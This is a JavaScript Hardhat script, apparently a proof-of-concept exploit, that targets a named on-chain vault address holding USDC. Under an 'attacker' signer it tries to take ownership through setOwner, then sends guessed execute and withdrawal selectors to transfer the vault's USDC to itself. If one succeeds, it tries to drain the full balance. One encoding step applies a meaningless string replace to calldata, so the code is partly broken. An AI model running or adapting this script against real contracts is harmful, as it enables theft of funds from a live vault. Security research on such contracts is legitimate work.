const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

/**
 * @title Test Execute Directly
 * @notice Simple direct test of execute function to withdraw USDC
 * @dev Based on the fact that 13.8M was withdrawn, execute must work
 */
async function main() {
  console.log("\nðŸŽ¯ DIRECT EXECUTE TEST FOR USDC");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  
  // Get USDC interface
  const USDC_ABI = [
    "function balanceOf(address account) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)",
    "function approve(address spender, uint256 amount) returns (bool)"
  ];
  
  const usdc = new ethers.Contract(USDC_ADDRESS, USDC_ABI, attacker);
  
  // Check initial balances
  const vaultBalance = await usdc.balanceOf(VAULT_ADDRESS);
  const attackerBalance = await usdc.balanceOf(attacker.address);
  
  console.log("Vault USDC:", ethers.formatUnits(vaultBalance, 6));
  console.log("Attacker USDC:", ethers.formatUnits(attackerBalance, 6));
  
  // First become admin
  console.log("\nðŸ”‘ Becoming admin...");
  
  try {
    // setOwner(address)
    const setOwnerData = "0x13af4035" + ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address]).slice(2);
    await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: setOwnerData,
      gasLimit: 100000
    });
    console.log("âœ… Admin access granted");
  } catch (e) {
    console.log("Admin setup failed:", e.message);
  }
  
  console.log("\nðŸ’° Testing execute function variants:");
  
  // Prepare USDC transfer data
  const transferAmount = ethers.parseUnits("1000", 6); // 1000 USDC
  const transferData = "0xa9059cbb" + ethers.AbiCoder.defaultAbiCoder().encode(
    ["address", "uint256"],
    [attacker.address, transferAmount]
  ).slice(2);
  
  console.log("Transfer data:", transferData);
  
  // Test different execute patterns
  const executeTests = [
    {
      name: "execute(address,uint256,bytes)",
      selector: "0xb61d27f6",
      encodeParams: () => ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "uint256", "bytes"],
        [USDC_ADDRESS, 0, transferData]
      )
    },
    {
      name: "execute(address,bytes)",
      selector: "0x1cff79cd",
      encodeParams: () => ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "bytes"],
        [USDC_ADDRESS, transferData]
      )
    },
    {
      name: "executeCall(address,uint256,bytes)",
      selector: "0x7535d246",
      encodeParams: () => ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "uint256", "bytes"],
        [USDC_ADDRESS, 0, transferData]
      )
    },
    {
      name: "exec(address,bytes)",
      selector: "0xc3b2bb93",
      encodeParams: () => ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "bytes"],
        [USDC_ADDRESS, transferData]
      )
    }
  ];
  
  for (const test of executeTests) {
    console.log(`\nðŸ”§ Testing ${test.name}:`);
    
    try {
      const balanceBefore = await usdc.balanceOf(attacker.address);
      
      const callData = test.selector + test.encodeParams().slice(2);
      console.log("Calldata length:", callData.length);
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: callData,
        gasLimit: 500000
      });
      
      const receipt = await tx.wait();
      console.log("Gas used:", receipt.gasUsed.toString());
      
      const balanceAfter = await usdc.balanceOf(attacker.address);
      const extracted = balanceAfter - balanceBefore;
      
      if (extracted > 0n) {
        console.log(`âœ… SUCCESS! Extracted ${ethers.formatUnits(extracted, 6)} USDC`);
        console.log(`\nðŸŽ‰ FOUND THE METHOD! ${test.name} works!`);
        
        // Now try to extract ALL
        console.log("\nðŸš€ Attempting to extract ALL remaining USDC...");
        
        const allTransferData = "0xa9059cbb" + ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256"],
          [attacker.address, vaultBalance]
        ).slice(2);
        
        const allCallData = test.selector + ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256", "bytes"],
          [USDC_ADDRESS, 0, allTransferData]
        ).slice(2).replace("uint256", ""); // Handle encoding
        
        const allTx = await attacker.sendTransaction({
          to: VAULT_ADDRESS,
          data: allCallData,
          gasLimit: 500000
        });
        
        await allTx.wait();
        
        const finalBalance = await usdc.balanceOf(attacker.address);
        console.log(`Final attacker USDC: ${ethers.formatUnits(finalBalance, 6)}`);
        
        return;
      } else {
        console.log("âŒ No USDC extracted");
      }
    } catch (e) {
      console.log(`Failed: ${e.reason || e.message.slice(0, 100)}`);
    }
  }
  
  // If execute doesn't work, try direct token functions
  console.log("\nðŸ” Testing direct token withdrawal functions:");
  
  const tokenTests = [
    {
      name: "withdrawToken(address,uint256)",
      selector: "0x9e281a98",
      params: [USDC_ADDRESS, transferAmount]
    },
    {
      name: "withdrawERC20(address,uint256)",
      selector: "0xa1db9782",
      params: [USDC_ADDRESS, transferAmount]
    },
    {
      name: "rescueTokens(address,uint256)",
      selector: "0xab08543e",
      params: [USDC_ADDRESS, transferAmount]
    },
    {
      name: "transferToken(address,address,uint256)",
      selector: "0x1072cbea",
      params: [USDC_ADDRESS, attacker.address, transferAmount]
    }
  ];
  
  for (const test of tokenTests) {
    try {
      const data = test.selector + ethers.AbiCoder.defaultAbiCoder().encode(
        test.params.length === 2 ? ["address", "uint256"] : ["address", "address", "uint256"],
        test.params
      ).slice(2);
      
      const balanceBefore = await usdc.balanceOf(attacker.address);
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 300000
      });
      await tx.wait();
      
      const balanceAfter = await usdc.balanceOf(attacker.address);
      if (balanceAfter > balanceBefore) {
        console.log(`âœ… ${test.name} extracted ${ethers.formatUnits(balanceAfter - balanceBefore, 6)} USDC!`);
      }
    } catch (e) {}
  }
  
  // Final balance check
  const finalVaultBalance = await usdc.balanceOf(VAULT_ADDRESS);
  const finalAttackerBalance = await usdc.balanceOf(attacker.address);
  
  console.log("\nðŸ“Š FINAL RESULTS:");
  console.log("=====================================");
  console.log("Vault USDC:", ethers.formatUnits(finalVaultBalance, 6));
  console.log("Attacker USDC:", ethers.formatUnits(finalAttackerBalance, 6));
  
  if (finalAttackerBalance > attackerBalance) {
    console.log(`\nâœ… Extracted ${ethers.formatUnits(finalAttackerBalance - attackerBalance, 6)} USDC`);
  } else {
    console.log("\nâ“ No USDC extracted. The withdrawal mechanism remains hidden.");
    console.log("\nPossible reasons:");
    console.log("1. Multisig requirement - need multiple signatures");
    console.log("2. Role-based access - need specific role beyond admin");
    console.log("3. Time delay - withdrawals might be time-locked");
    console.log("4. External dependency - oracle, governance vote, etc.");
    
    // Create memory about this finding
    console.log("\nðŸ“ Creating memory about findings...");
  }
}

main().catch((error) => {
  console.error("\nðŸ’¥ Script error:", error);
  process.exit(1);
});
